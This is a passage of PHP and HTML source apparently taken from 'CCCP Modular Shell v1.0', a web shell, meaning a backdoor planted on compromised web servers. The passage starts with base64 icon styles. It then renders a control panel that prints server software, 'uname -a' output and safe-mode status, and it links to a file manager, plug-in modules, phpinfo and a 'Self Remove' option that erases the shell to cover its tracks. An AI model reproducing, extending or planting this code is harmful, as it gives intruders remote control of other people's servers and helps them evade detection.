		.jpg{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXETCgDAwMCAgID///+AgAD/AAAA/wCvPqjdAAAAAXRSTlMAQObYZgAAAF9JREFUeAE1yMENAiAMRuGOwG+I3Em4G2QBavVenICLK7C+bY3v9OXR3SNriAjf/njQDkxcDc/WlD+JBgP62mSnHLVhp5w3kh/UfomTAY6TRQO81g8TQEAsR6+eAVGiL7noFeTJktBqAAAAAElFTkSuQmCC") no-repeat;}
		.js{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEX////AwMCAgIAAAAD//wCAgAA6+FsGAAAAWklEQVR4XlWLyw3AIAxDA2oHQFkgfAZAZAGqTsAh+69SYk716Vl+pnJSSWizEG+IczJAbI2+IdLkDLhN1ScocJqt/n+VagFyGP1xkLddmGKq6ciq6vecEPaOfCLwDtcqFA/EAAAAAElFTkSuQmCC") no-repeat;}
		.lnk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXFmzzYmnRNLuigJZAUAAgCI71YEPgJXrsCKAAAAAXRSTlMAQObYZgAAAGRJREFUeF4lzLEKgDAMRdEMFedQ7W6LOItgZ8HuRQjuKv5B/9+8mulwE0K0YxIReR9mThlYuBMAQbBa2CKQBh4rmPVGMVh2V0Xc3hsI5fgxyekeoEi79oBk4wrQkIl4qDQ1oCF8s2QTzGgZmRgAAAAASUVORK5CYII=") no-repeat;}
		.log{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHAwMAAAAD///+AgIAAALWAgAD//wD7+LBgAAAAAXRSTlMAQObYZgAAAFxJREFUeF41jMsJgEAMRIcFC/DiOYxsAf5yly1BbECELcD+wWSN7/SYgQeIAyCtxmxSRkc6lMWY5AzJB/beyVssjEuZv6tebIs+tzSpSvg1kAJfaEH8ZUTQJNEBXtl7FF5T+NYtAAAAAElFTkSuQmCC") no-repeat;}
		.mp3{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH////AwMCAgIAAAACAgAD//wAFULzlAAAAAXRSTlMAQObYZgAAAGdJREFUeAE1ykEKAjEUA9AgzgFC5wKjg2tj1X2hPcAH7Qm8/xlMi2aTR/4HkJ2rGyJ5/mMb0yOTtQJLtCB34J2KkrHEZ5OMuKxuoz/Xoqwdx+bTfL73Ig0c2iuS4amSE+IPt5MzUGe+vOoRl1gyM5QAAAAASUVORK5CYII=") no-repeat;}
		.php{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEXt7u20pbN1PXqqna3h3+CiY5iji5/Cn72aaulJAAAAB3RSTlP+C/jy9vd9m8nrNgAAAGNJREFUeF41zMEJwCAMheF36AK5dAChOIDiuZRMIATP0tIBKpL1m4r9L/kg8EAXM1ciEKz0I9SJliYWnoCdVUc3RLpIEUH2sRU9NjivUfVxhhx8d4YZ1jCqIN6/RTKMDGewEr0JfRdojfORagAAAABJRU5ErkJggg==") no-repeat;}
		.pl{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVLS/WWlrdzc7O7u/L39/0vLzB1dXfIyLy8AAAAbUlEQVR4XkXLQQ4CIQyF4RfxAjWVteIFUAxryfQEmrKfCHP/I0jJJP6rL3l5oD2wSH6KFHC694+Bat+qwa+lKtvkt6xNHmDRs7ZSccHsgFuMA24ARwdnWF7JJQMQsWNO/xcvun69vkEUAp3C9QcQsBJpjnPQBwAAAABJRU5ErkJggg==") no-repeat;}
		.py{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASBAMAAACgFUNZAAAAFVBMVEXU1dBJSUmIiIhMaXH39/ZJf6z12mal68qMAAAABHRSTlPwbJkA1LtzKgAAAGFJREFUeF49yrsNhEAMRdGHZBMjoAFowQ04sIg38cYTTf8l8MwIbnT8wXo+HdhFgjl2BwbCM6UgqvkruOaAJtGIZP/+AYW59wJHVs8vnJcGIq7CRDjhGxHOhRXIzbCATWY3y8IfVW0lgwUAAAAASUVORK5CYII=") no-repeat;}
		.rename{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAHlBMVEXP2unl6/NogqS8x9Y/R1L5+/2GlKecqLgrMTpabYUCMXjvAAAACXRSTlP99gP+rv7d/ScbTgzOAAAAdElEQVR4AWNQUmY2NmZrUgIyBBgYRDOgDNYQKINBpAnKCAExBIEAxGiHSiUXGwOBeQlDomBooGhoYAhD4vTk9OLUMBGGxInlCQHTw1gYEmeWTisvL2MBShVODE7MZGFImFg8LT1RTASoS1CAEWgiQ4sLBAAAQBEfQdjw2gUAAAAASUVORK5CYII=") no-repeat;}
		.swf{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAGFBMVEVMaXEAAAD/////RBylAAD8z5/njpP/tgDJs8ZAAAAAAXRSTlMAQObYZgAAAGpJREFUeAFjwAEYBcEAzFQCAUUoM1zJSCkAwlQPMgo2ADGBrFJTU4gC1fJ04wCoWrUiVWNjCDPFSdkYIqriFuIC1aYSlJLsZAxV66LmxgxiKgqpuCmZQNQKhiQpqYCZimIgR6A4B+FIHAAAPKISiDRgUyIAAAAASUVORK5CYII=") no-repeat;}
		.tar{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXE7QAUXAAAAUW/l6ey8lKGJBVFVz9lgkT8gAAAAAXRSTlMAQObYZgAAAFJJREFUeAFjEIQAAYbQ0MQ0IEhicHFJcQkNDQ0CMlJhIoJKIMCgBAEKQMXGYACUMnEvLy8vBjJMYSKCYAayYogdQCkRkOJCIEMUpMQQpBgM4IoBaBkbvmcdFLkAAAAASUVORK5CYII=") no-repeat;}
		.txt{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAD1BMVEVMaXH///8AAADHx8eFhYXIFtsVAAAAAXRSTlMAQObYZgAAADVJREFUeAFjYGACAwYQUHQEAQUgi0UIAkBMQTAwQmcqKSopYRFVolQUwTQGAxCTQQkMgC4DAOb7DCz7id5MAAAAAElFTkSuQmCC") no-repeat;}
		.unk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXGFptrR5PxfaHnx9/60zPMlTqR1iLk29K4nAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjYBAEAgEGIBBxcXERNIAxxMEM1yClcAMgwzUtLUkVxHBLD08DM8KSlCAMJyVFMENISaksFcwACgSFAhlFSmqJqhCGqmgoTASVUQiyvhzIYDYGAQMAJZwXv2puTlMAAAAASUVORK5CYII=") no-repeat;}
		.xml{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH6+vqGhoYAAAAsap6Kyu8AAJYzmQAtPsCtAAAAAXRSTlMAQObYZgAAAE9JREFUeAFjUAIDBgYGRUEgEFWAMYSgDGFjAwZFUUEXR1FBICNMRDRMLNCAQTVRJLRMMBUsEp4GFAGpSUsEqxEEARBDxAUI8IogGMYQYAAA5l8SSFIGd4wAAAAASUVORK5CYII=") no-repeat;}
	  </style>
	</head>
	<body>
	  <center>
		<table style="border-collapse: collapse" height="1" cellspacing="0" cellpadding="5" width="100%" bgcolor="#333333" border="1" bordercolor="#C0C0C0">
		  <tr>
			<th width="100%" height="15" nowrap="nowrap" bordercolor="#C0C0C0" valign="top" colspan="2">
			  <p><font face="Verdana" size="5"><b>CCCP Modular Shell</b></font></p>
			</th>
		  </tr>
		  <tr>
			<td>
			  <p align="left"><b>Software: </b><a href="#" onclick="ajaxLoad('me=phpinfo')"><b><?php echo $_SERVER['SERVER_SOFTWARE']; ?></b></a></p>
			  <p align="left"><b>uname -a: <?php echo php_uname(); ?></b></p>
			  <p align="left"><b>Safe-mode: <?php echo getcfg('safe_mode'); ?></b></p>
			  <br><center><?php # Menu
							$i = 0;
							$countMenu = count($CCCPmod);
							$sysMenu = '<a href="#" onclick="ajaxLoad(\'me=file\');"><b>' . tText('fm', 'File Manager') . '</b></a> | ';
							while ($i < $countMenu){
								$sysMenu .= '<a href="#" onclick="ajaxLoad(\'me=' . $CCCPmod[$i] . '\');"><b>' . $CCCPtitle[$i] . '</b></a>' . ($i == $countMenu ? '' : ' | ');
								$i++;
							}			 
							echo $sysMenu . '<a href="#" onclick="ajaxLoad(\'me=srm\');"><b>' . tText('srm', 'Self Remove') . '</b></a> ' . (($config['sPass']) ? ' | <a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) window.close();return false;"><b>' . tText('logout', 'Logout') . '</b></a>' : '');
						?></center>
			</td>
		  </tr>
		  <tr>
			<td id="content" width="100%"></td>
		  </tr>
		</table>

	  --[ <a href="http://indetectables.net" target="_blank">CCCP Modular Shell v1.0 by DSR!</a> <b>|</b> Generation time: <span id="uetime">0.00</span> ]--
	  </center>
	</body>
	</html>

